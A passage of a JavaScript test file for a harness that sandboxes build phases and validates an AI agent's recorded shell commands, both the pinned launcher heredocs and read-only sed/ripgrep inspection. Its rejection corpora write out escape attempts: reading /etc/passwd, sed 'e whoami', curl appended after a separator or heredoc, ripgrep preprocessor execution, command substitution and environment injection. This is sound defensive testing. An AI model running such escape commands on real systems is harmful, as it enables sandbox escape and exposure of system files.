          return spawnSync("/usr/bin/sandbox-exec", ["-f", phaseProfile, "/bin/sh", "-c", command], { encoding: "utf8" });
        };
        const maliciousHarness = executePhase(
          "harness.sb",
          [graphOutput],
          [harnessOutput, phaseTemporary],
          `printf replaced > ${JSON.stringify(join(graphOutput, "index.js"))}`,
        );
        expect(maliciousHarness.status, "the harness phase cannot overwrite graph output").not.toBe(0);
        expect(readFileSync(join(graphOutput, "index.js"), "utf8"), "graph output keeps its authenticated bytes").toBe("authenticated graph output\n");

        const maliciousRust = executePhase(
          "rust.sb",
          [graphOutput, harnessOutput],
          [rustOutput, phaseTemporary],
          `printf replaced > ${JSON.stringify(join(harnessOutput, "index.js"))}`,
        );
        expect(maliciousRust.status, "the Rust phase cannot overwrite harness output").not.toBe(0);
        expect(readFileSync(join(harnessOutput, "index.js"), "utf8"), "harness output keeps its authenticated bytes").toBe("authenticated harness output\n");

        const capture = readCaptureScript();
        expect(capture, "capture profiles the graph build phase").toContain("graphBuildSandboxProfile");
        expect(capture, "capture profiles the harness build phase").toContain("harnessBuildSandboxProfile");
        expect(capture, "capture profiles the Rust build phase").toContain("rustBuildSandboxProfile");
        expect(capture, "capture fails closed when Rust overwrites JavaScript outputs").toContain("Rust compilation changed a completed JavaScript output.");
      } finally {
        rmSync(phaseDirectory, { recursive: true, force: true });
      }
    },
    30_000,
  );
  it("gates pending checks on the deadline and interruption signals", async () => {
    const check = vi.fn();
    await expect(settleBeforeDeadline(check, {
      label: "expired check",
      deadline: 999,
      timeoutMs: 250,
      now: () => 1_000,
    }), "an expired deadline rejects before starting the check").rejects.toMatchObject({ code: "RELAYER_WAIT_DEADLINE" });
    expect(check, "the expired check never starts").not.toHaveBeenCalled();

    let interrupt;
    const interruption = new Promise((resolve) => { interrupt = resolve; });
    const pendingInterrupt = settleBeforeDeadline(() => new Promise(() => {}), {
      label: "renderer check",
      deadline: Date.now() + 60_000,
      timeoutMs: 60_000,
      interruption,
    });
    const interrupted = expect(pendingInterrupt, "an interruption rejects without waiting for the deadline").rejects.toMatchObject({ code: "RELAYER_WAIT_INTERRUPTED" });
    interrupt();
    await interrupted;

    vi.useFakeTimers();
    try {
      const pending = settleBeforeDeadline(() => new Promise(() => {}), {
        label: "renderer check",
        deadline: 1_250,
        timeoutMs: 250,
        now: () => 1_000,
      });
      const rejected = expect(pending, "a pending check rejects at its deadline").rejects.toMatchObject({ code: "RELAYER_WAIT_DEADLINE" });
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });

  it("aborts timed-out or failed media and preserves diagnostics", async () => {
    {
      let close;
      const closed = new Promise((resolve) => { close = resolve; });
      const abort = vi.fn(close);
      await expect(settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
        label: "ffmpeg encoder",
        timeoutMs: 60_000,
        abort,
        closed,
      }), "a media process error aborts and awaits close").rejects.toThrow("encoder failed");
      expect(abort, "the error path aborts once").toHaveBeenCalledOnce();
    }
    {
      let close;
      const closed = new Promise((resolve) => { close = resolve; });
      const inputError = new Error("write EPIPE");
      const abort = vi.fn(() => queueMicrotask(close));
      await expect(settleMediaCompletion(Promise.reject(inputError), {
        label: "ffmpeg frame encoder",
        timeoutMs: 60_000,
        abort,
        closed,
        diagnostics: () => "invalid JPEG data at frame 4",
      }), "an encoder input failure retains stderr diagnostics and its cause").rejects.toMatchObject({
        message: expect.stringContaining("invalid JPEG data at frame 4"),
        cause: inputError,
      });
      expect(abort, "the input-failure path aborts once").toHaveBeenCalledOnce();
    }
    vi.useFakeTimers();
    try {
      let close;
      let closed = false;
      const closePromise = new Promise((resolve) => { close = resolve; });
      const abort = vi.fn(() => {
        queueMicrotask(() => {
          closed = true;
          close();
        });
      });
      const pending = settleMediaCompletion(new Promise(() => {}), {
        label: "ffmpeg encoder",
        timeoutMs: 250,
        abort,
        closed: closePromise,
        diagnostics: () => "decoder stalled",
      });
      const rejected = expect(pending, "a stalled encoder aborts at its timeout").rejects.toMatchObject({
        code: "RELAYER_MEDIA_DEADLINE",
        message: expect.stringContaining("decoder stalled"),
      });
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
      expect(abort, "the timeout path aborts once").toHaveBeenCalledOnce();
      expect(closed, "the timeout path awaits close").toBe(true);
    } finally {
      vi.useRealTimers();
    }
  });

  it("forces media shutdown after the abort grace and hard-fails a stuck close", async () => {
    vi.useFakeTimers();
    try {
      let close;
      const closed = new Promise((resolve) => { close = resolve; });
      const abort = vi.fn();
      const force = vi.fn(close);
      const pending = settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
        label: "ffmpeg encoder",
        timeoutMs: 60_000,
        abort,
        force,
        closed,
        abortCloseTimeoutMs: 250,
        forceCloseTimeoutMs: 250,
      });
      const rejected = expect(pending, "forced shutdown still surfaces the original error").rejects.toThrow("encoder failed");
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
      expect(abort, "abort runs before forced shutdown").toHaveBeenCalledOnce();
      expect(force, "forced shutdown runs after the abort grace").toHaveBeenCalledOnce();
    } finally {
      vi.useRealTimers();
    }
    vi.useFakeTimers();
    try {
      const pending = settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
        label: "ffmpeg encoder",
        timeoutMs: 60_000,
        abort: vi.fn(),
        force: vi.fn(),
        closed: new Promise(() => {}),
        diagnostics: () => "stuck stderr",
        abortCloseTimeoutMs: 250,
        forceCloseTimeoutMs: 250,
      });
      const rejected = expect(pending, "a close that never settles hard-fails").rejects.toMatchObject({
        code: "RELAYER_MEDIA_CLOSE_DEADLINE",
        message: expect.stringContaining("stuck stderr"),
      });
      await vi.advanceTimersByTimeAsync(500);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });

  it("pins, orders, retains, and streams the exact frame-byte lifecycle", async () => {
    const pins = new Map();
    const second = Buffer.from("second");
    const first = Buffer.from("first");
    pinUniqueBytes(pins, "frame-000001.jpg", second);
    pinUniqueBytes(pins, "frame-000000.jpg", first);

    const observed = [...pins.values()].map((pin) => ({ ...pin }));
    const orderedObserved = [...observed].sort((left, right) => left.file.localeCompare(right.file));
    expect(verifyPinnedByteInventory(pins, observed), "unchanged frame inventory").toEqual(orderedObserved);
    const changed = observed.map((pin) => ({ ...pin }));
    changed[0] = { file: changed[0].file, ...bytePin(Buffer.from("changed")) };
    expect(() => verifyPinnedByteInventory(pins, changed), "changed frame bytes")
      .toThrow("changed after they were pinned");

    expect(pinnedSequenceSha256(pins), "ordered sequence digest").toMatch(/^[0-9a-f]{64}$/);
    expect(() => pinUniqueBytes(pins, "frame-000000.jpg", Buffer.from("replacement")), "duplicate frame path")
      .toThrow("more than once");

    const buffers = new Map([
      ["frame-000001.jpg", second],
      ["frame-000000.jpg", first],
    ]);
    expect(pinnedBuffersInFileOrder(pins, buffers), "file-ordered buffers").toEqual([first, second]);

    const written = [];
    const sink = new Writable({
      highWaterMark: 1,
      write(chunk, _encoding, callback) {
        written.push(Buffer.from(chunk));
        setImmediate(callback);
      },
    });
    await pipeByteChunks(sink, pinnedBuffersInFileOrder(pins, buffers));
    expect(Buffer.concat(written).toString(), "streamed frame order").toBe("firstsecond");

    const failed = new Writable({
      write(_chunk, _encoding, callback) {
        callback(new Error("encoder input failed"));
      },
    });
    await expect(pipeByteChunks(failed, [Buffer.from("frame")]), "sink error propagation")
      .rejects.toThrow("encoder input failed");

    second.fill(0);
    expect(() => pinnedBuffersInFileOrder(pins, buffers), "retained buffer mutation")
      .toThrow("changed after they were pinned");
  });
  it("rejects the graph-authoring launcher mutation corpus", () => {
    const singleActionEvent = (command) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    });
    const cases = [
      ["an argument", () => [singleActionEvent(`${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} --inspect <<'EOF'\nEOF`)]],
      ["a different launcher", () => [singleActionEvent('"/private/var/folders/[redacted]/runtime/alternate-launcher" <<\'EOF\'\nEOF')]],
      ["an unquoted heredoc", () => [singleActionEvent(`${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<EOF\nEOF`)]],
      ["a double-quoted heredoc", () => [singleActionEvent(`${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<"EOF"\nEOF`)]],
      ["a bare node heredoc", () => [singleActionEvent("node --input-type=module <<'EOF'\nEOF")]],
      ["a shell action after the heredoc", () => [singleActionEvent(`${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<'EOF'\nEOF\nnode --input-type=module`)]],
      ["a redaction-colliding launcher", () => {
        const command = pinnedGraphCommand();
        return [{
          type: "provider.event",
          data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{
            command,
            relayerGraphAuthoringLauncherSha256: createHash("sha256")
              .update("/private/var/folders/zz/other-run/T/runtime/graph-authoring-launcher")
              .digest("hex"),
          }] } } },
        }];
      }],
    ];
    expect(cases, "launcher mutation inventory").toHaveLength(7);
    for (const [label, buildEvents] of cases) {
      expect.soft(() => validateEvidenceCommands(buildEvents()), label)
        .toThrow("exact pinned graph-authoring launcher heredoc");
    }
  });

  it("accepts pinned heredocs and read-only inspection sequences", () => {
    const event = (command, commandActions = [{ command }]) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions } } },
    });
    expect(validateEvidenceCommands([
      event('/bin/zsh -lc "graph"', [{ command: '"/private/var/folders/[redacted]/runtime/graph-authoring-launcher" <<\'EOF\'\nconst detail = "curl is documentation, not a shell action";\nawait graph.submit(node);\nEOF' }]),
    ]), "a heredoc with a leading detail line").toBe(1);
    expect(validateEvidenceCommands([
      event('/bin/zsh -lc "graph"', [{ command: '"/private/var/folders/[redacted]/runtime/graph-authoring-launcher" <<\'EOF\'\nawait graph.submit(node);\nEOF' }]),
    ]), "a plain pinned heredoc").toBe(1);
    const eofCommand = `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<'EOF'\nawait graph.submit(1);\n`;
    expect(validateEvidenceCommands([{
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: eofCommand, commandActions: [{ command: eofCommand }] } } },
    }]), "a nonempty heredoc terminated by end-of-input").toBe(1);

    const inspectionEvent = (command) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{
        ...(command.startsWith(PINNED_SED) || command.startsWith(PINNED_RG)
          ? authenticatedInspectionAction(command)
          : { command }),
      }] } } },
    });
    expect(validateEvidenceCommands([
      inspectionEvent(`${PINNED_SED} -n '1,240p' ${INSPECTION_ROOT}/index.js`),
      inspectionEvent(`${PINNED_RG} -n 'class LayerLayoutObject|LayerLayoutObject|class NodeObject' /private/var/folders/[redacted]/runtime/graph-client -g '*.js' -g '*.d.ts'`),
      inspectionEvent(`${PINNED_RG} --glob '!vendor/**' approvalDock /private/var/folders/[redacted]/runtime/graph-client`),
      inspectionEvent(pinnedGraphCommand("await graph.submit(node);")),
    ], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedInspectionRawRoots: [RAW_INSPECTION_ROOT],
      allowedSedExecutable: PINNED_SED,
      allowedSedExecutableSha256: inspectionAuthority.allowedSedExecutableSha256,
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
    }), "narrow read-only inspection before the required pinned graph command").toBe(1);

    const groupedEvent = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "grouped", commandActions } } },
    });
    expect(validateEvidenceCommands([
      groupedEvent([
        authenticatedInspectionAction(`${PINNED_SED} -n '1,160p' ${INSPECTION_ROOT}/objects.d.ts`),
        authenticatedInspectionAction(`${PINNED_SED} -n '160,320p' ${INSPECTION_ROOT}/objects.js`),
      ]),
      groupedEvent([{ command: pinnedGraphCommand("await graph.submit(node);") }]),
    ], inspectionAuthority), "an observed grouped execution passes when every action is read-only").toBe(1);

    const attemptEvent = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "observed", commandActions } } },
    });
    const pinned = (body) => pinnedGraphCommand(body);
    expect(validateEvidenceCommands([
      attemptEvent([{ type: "unknown", command: pinned("const layout = new LayerLayoutObject(1, []);") }]),
      attemptEvent([{ type: "search", ...authenticatedInspectionAction(`${PINNED_RG} -n 'class LayerLayoutObject|LayerLayoutObject' /tmp/runtime-snapshot/node_modules/@relayer/graph-client`) }]),
      attemptEvent([
        { type: "read", ...authenticatedInspectionAction(`${PINNED_SED} -n '1,55p' /tmp/runtime-snapshot/node_modules/@relayer/graph-client/dist/objects.d.ts`) },
        { type: "read", ...authenticatedInspectionAction(`${PINNED_SED} -n '1,55p' /tmp/runtime-snapshot/node_modules/@relayer/graph-client/dist/objects.js`) },
      ]),
      attemptEvent([{ type: "unknown", command: pinned("const layout = new LayerLayoutObject([]);") }]),
    ], {
      allowedInspectionRoots: ["/tmp/runtime-snapshot/node_modules/@relayer/graph-client"],
      allowedInspectionRawRoots: ["/tmp/runtime-snapshot/node_modules/@relayer/graph-client"],
      allowedSedExecutable: PINNED_SED,
      allowedSedExecutableSha256: inspectionAuthority.allowedSedExecutableSha256,
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
    }), "a failed pinned attempt followed by inspection and a corrected attempt").toBe(2);

    const traceCommand = `${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`;
    const readOnlyEvent = {
      type: "provider.event",
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command: traceCommand,
        commandActions: [authenticatedInspectionAction(traceCommand)],
      } } },
    };
    expect(validateEvidenceCommands([readOnlyEvent], {
      ...inspectionAuthority,
      requirePinnedGraph: false,
    }), "a partial trace validates without inventing a pinned graph requirement").toBe(0);
    expect(() => validateEvidenceCommands([{
      ...readOnlyEvent,
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command: "sed",
        commandActions: [{ command: "sed -n '1,20p' /etc/passwd" }],
      } } },
    }], {
      allowedInspectionRoots: ["/snapshot/graph-client"],
      requirePinnedGraph: false,
    }), "a partial trace still rejects unauthorized inspection").toThrow("inspect source read-only");
  });

  it("rejects unauthorized inspection executables and escaping paths", () => {
    const singleActionEvent = (command) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    });
    const authenticatedEvent = (action) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command: action.command,
        commandActions: [action],
      } } },
    });
    const rgRejection = (executable) => () => validateEvidenceCommands([
      singleActionEvent(`${executable} -n needle /private/var/folders/[redacted]/runtime/graph-client`),
    ], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
      requirePinnedGraph: false,
    });
    const pathRejection = (path) => () => validateEvidenceCommands([
      authenticatedEvent(authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${path}`)),
      authenticatedEvent({ command: pinnedGraphCommand("await graph.submit(node);") }),
    ], inspectionAuthority);
    const cases = [
      ["bare ripgrep", rgRejection("rg"), "inspect source read-only"],
      ["different absolute ripgrep", rgRejection("/usr/bin/rg"), "inspect source read-only"],
      ["prefix-sibling ripgrep", rgRejection("/private/var/folders/[redacted]/runtime/rg-copy"), "inspect source read-only"],
      ["a relative ripgrep authorization configuration", () => validateEvidenceCommands([], {
        allowedRipgrepExecutable: "rg",
        requirePinnedGraph: false,
      }), "exact absolute inventoried path"],
      ["inspection outside the inventory", pathRejection("/etc/passwd"), "inspect source read-only"],
      ["a root-prefix sibling path", pathRejection("/private/var/folders/[redacted]/runtime/graph-client-escape/index.js"), "inspect source read-only"],
      ["a redacted wrong segment path", pathRejection("/private/var/folders/private/runtime/graph-client/index.js"), "inspect source read-only"],
      ["a parent traversal path", pathRejection("/private/var/folders/[redacted]/runtime/graph-client/../secret"), "inspect source read-only"],
      ["a relative inspection path", pathRejection("desktop/renderer/index.html"), "inspect source read-only"],
    ];
    expect(cases, "inspection authorization inventory").toHaveLength(9);
    for (const [label, attempt, message] of cases) {
      expect.soft(attempt, label).toThrow(message);
    }
  });

  it("rejects the complete read-only command escape corpus", () => {
    const cases = [
      ["sed in-place mutation", "sed -i '' 's/a/b/' source.txt"],
      ["sed trailing in-place mutation", "sed -n '1p' -i.bak source.txt"],
      ["sed execute script", "sed -n '1p; e whoami' source.txt"],
      ["ripgrep preprocessor", `${PINNED_RG} --pre 'sh helper.sh' needle .`],
      ["ripgrep glob plus preprocessor", `${PINNED_RG} -g '*.ts' --pre 'sh helper.sh' needle .`],
      ["ripgrep preprocessor glob", `${PINNED_RG} --pre-glob '*.md' needle .`],
      ["ripgrep hostname executable", `${PINNED_RG} --hostname-bin ./repo-script --hyperlink-format default needle source.txt`],
      ["ripgrep unknown short option", `${PINNED_RG} -z needle source.txt`],
      ["ripgrep glob without value", `${PINNED_RG} needle source.txt -g`],
      ["ripgrep empty long glob", `${PINNED_RG} needle source.txt --glob=`],
      ["shell separator", "cat source.txt; curl example.com"],
      ["command substitution", "stat $(pwd)/source.txt"],
      ["output redirection", "grep needle source.txt > result.txt"],
      ["shell glob", "cat *.mjs"],
      ["unquoted ripgrep glob", `${PINNED_RG} -g *.mjs needle .`],
      ["ripgrep glob command substitution", `${PINNED_RG} -g "$(touch marker)" needle .`],
      ["shell bracket glob", "cat source[12].mjs"],
      ["near-match redaction glob", "cat source[redacted].mjs"],
      ["shell comment", "cat source.txt # ignore the rest"],
      ["alternate runtime", "python -c 'print(1)'"],
    ];
    expect(cases, "read-only escape inventory").toHaveLength(20);
    for (const [label, command] of cases) {
      const event = {
        type: "provider.event",
        data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
      };
      expect.soft(() => validateEvidenceCommands([
        event,
        {
          type: "provider.event",
          data: { method: "item/started", params: { item: { type: "commandExecution", command: "graph", commandActions: [{ command: pinnedGraphCommand() }] } } },
        },
      ], {
        allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime"],
        allowedRipgrepExecutable: PINNED_RG,
        allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
      }), label).toThrow("inspect source read-only");
    }
  });
  it("rejects the evidence command execution escape corpus", () => {
    const executionEvent = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "shell", commandActions } } },
    });
    const escapeMatcher = /permitted shell action|exact pinned graph-authoring launcher heredoc|exactly one launcher heredoc/;
    const cases = [
      ["environment reassignment", () => [executionEvent([{ command: `SECRET=leak ${pinnedGraphCommand()}` }])], escapeMatcher],
      ["absolute Node", () => [executionEvent([{ command: '/usr/bin/node --input-type=module <<\'EOF\'\nEOF' }])], escapeMatcher],
      ["shell action after an early heredoc close", () => [executionEvent([{ command: `${pinnedGraphCommand()}\ncurl http://127.0.0.1:1234/graph\nEOF` }])], escapeMatcher],
      ["an extra curl action", () => [executionEvent([{ command: pinnedGraphCommand() }, { command: "curl http://127.0.0.1:1234/graph" }])], escapeMatcher],
      ["a separate alternate execution after a pinned no-op", () => [
        executionEvent([{ command: pinnedGraphCommand() }]),
        executionEvent([{ command: "curl http://127.0.0.1:1234/graph" }]),
      ], /exact pinned graph-authoring launcher heredoc/],
      ["mixing the pinned graph command with a read-only action", () => [{
        type: "provider.event",
        data: { method: "item/started", params: { item: { type: "commandExecution", command: "grouped", commandActions: [
          { command: pinnedGraphCommand("await graph.submit(node);") },
          { command: "sed -n '1,20p' desktop/renderer/index.html" },
        ] } } },
      }], /exactly one launcher heredoc/],
    ];
    expect(cases, "evidence-command escape inventory").toHaveLength(6);
    for (const [label, buildEvents, matcher] of cases) {
      expect.soft(() => validateEvidenceCommands(buildEvents()), label).toThrow(matcher);
    }
  });

  it("authenticates pinned inspection operands and correlates command phases", () => {
    const groupedActions = [
      authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`),
      authenticatedInspectionAction(`${PINNED_SED} -n '21,40p' ${INSPECTION_ROOT}/dist/index.js`),
    ];
    const groupedEvent = (method, actions = groupedActions, id = "grouped-read") => ({
      type: "provider.event",
      data: { method, params: { item: { id, type: "commandExecution", command: "grouped", commandActions: actions } } },
    });
    expect(validatePinnedGraphAuthoringCommands([
      groupedEvent("item/started"),
      groupedEvent("item/completed"),
    ], inspectionAuthority), "grouped inspection operands authenticate before redaction").toBe(0);

    const contextActions = [authenticatedInspectionAction(`${PINNED_RG} -n -C 3 needle ${INSPECTION_ROOT}/dist/index.js`)];
    expect(validatePinnedGraphAuthoringCommands([{
      type: "provider.event",
      data: { method: "item/started", params: { item: { id: "context-read", type: "commandExecution", command: contextActions[0].command, commandActions: contextActions } } },
    }], inspectionAuthority), "numeric ripgrep context output authenticates").toBe(0);

    const contextCases = ["-C", "-C nope", "--context=all"];
    expect(contextCases, "invalid context-option inventory").toHaveLength(3);
    for (const contextOption of contextCases) {
      const command = `${PINNED_RG} -n ${contextOption} needle ${INSPECTION_ROOT}/dist/index.js`;
      const action = authenticatedInspectionAction(command);
      const contextEvent = {
        type: "provider.event",
        data: { method: "item/started", params: { item: { id: "invalid-context", type: "commandExecution", command, commandActions: [action] } } },
      };
      expect.soft(() => validatePinnedGraphAuthoringCommands([contextEvent], inspectionAuthority), `invalid ripgrep context option ${contextOption}`)
        .toThrow("inspect source read-only");
    }

    const collidingRawRipgrep = "/private/var/folders/xy/other-run/T/runtime/rg";
    const collidingRgCommand = `${PINNED_RG} -n needle /private/var/folders/[redacted]/runtime/graph-client`;
    expect(() => validateEvidenceCommands([{
      type: "provider.event",
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command: collidingRgCommand,
        commandActions: [{
          command: collidingRgCommand,
          relayerExecutableAuthoritySha256: createHash("sha256").update(collidingRawRipgrep).digest("hex"),
        }],
      } } },
    }], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
      requirePinnedGraph: false,
    }), "a redaction-colliding ripgrep path requires the exact pre-redaction digest").toThrow("inspect source read-only");

    const collidingCommand = `${PINNED_RG} -n needle ${INSPECTION_ROOT}/dist/index.js`;
    const collidingRaw = collidingCommand
      .replace(PINNED_RG, RAW_PINNED_RG)
      .replace(INSPECTION_ROOT, "/private/var/folders/xy/other-run/T/runtime/graph-client");
    const collidingAction = authenticatedInspectionAction(collidingCommand, collidingRaw);
    const collidingEvent = (method) => ({
      type: "provider.event",
      data: { method, params: { item: { id: "collision", type: "commandExecution", command: collidingCommand, commandActions: [collidingAction] } } },
    });
    expect(() => validatePinnedGraphAuthoringCommands([
      collidingEvent("item/started"),
      collidingEvent("item/completed"),
    ], inspectionAuthority), "inspection operands from a raw temp root colliding after redaction").toThrow("inspect source read-only");

    const phaseCases = [
      ["missing start", ["item/completed"]],
      ["duplicate start", ["item/started", "item/started", "item/completed"]],
      ["duplicate completion", ["item/started", "item/completed", "item/completed"]],
    ];
    expect(phaseCases, "phase-correlation inventory").toHaveLength(3);
    for (const [label, phases] of phaseCases) {
      const action = authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`);
      const events = phases.map((method) => ({
        type: "provider.event",
        data: { method, params: { item: { id: `phase-item-${label}`, type: "commandExecution", command: action.command, commandActions: [action] } } },
      }));
      expect.soft(() => validatePinnedGraphAuthoringCommands(events, inspectionAuthority), label)
        .toThrow(/matching validated start|Duplicate command/);
    }

    expect(() => validatePinnedGraphAuthoringCommands([
      groupedEvent("item/started", [groupedActions[0], groupedActions[1]], "changed-actions"),
      groupedEvent("item/completed", [groupedActions[1], groupedActions[0]], "changed-actions"),
    ], inspectionAuthority), "a completion whose grouped actions differ from its validated start").toThrow("does not match its validated start actions");

    const unfinishedAction = authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`);
    expect(() => validatePinnedGraphAuthoringCommands([{
      type: "provider.event",
      data: { method: "item/started", params: { item: { id: "unfinished", type: "commandExecution", command: unfinishedAction.command, commandActions: [unfinishedAction] } } },
    }], {
      ...inspectionAuthority,
      requireCommandCompletions: true,
    }), "sealing a complete trace requires a completion for every started command").toThrow("has no matching validated completion");
  });

  it("keeps the ask-profile capture entry point and shell launcher parseable on every platform", () => {
    // The entry point imports electron, so CI cannot execute it; a module
    // parse still catches syntax and import-list regressions on every
    // platform, which the text-token checks cannot.
    const moduleCheck = spawnSync(
      process.execPath,
      ["--input-type=module", "--check"],
      {
        input: readFileSync(
          new URL("../scripts/capture-ask-profile-evidence.mjs", import.meta.url),
        ),
        encoding: "utf8",
      },
    );
    expect(moduleCheck.status, moduleCheck.stderr || "the capture entry point parses without Electron").toBe(0);
    const launcherCheck = spawnSync("/bin/sh", [
      "-n",
      fileURLToPath(
        new URL("../scripts/launch-ask-profile-evidence.sh", import.meta.url),
      ),
    ], { encoding: "utf8" });
    expect(launcherCheck.status, launcherCheck.stderr || "the shell launcher passes sh -n").toBe(0);
  });
});
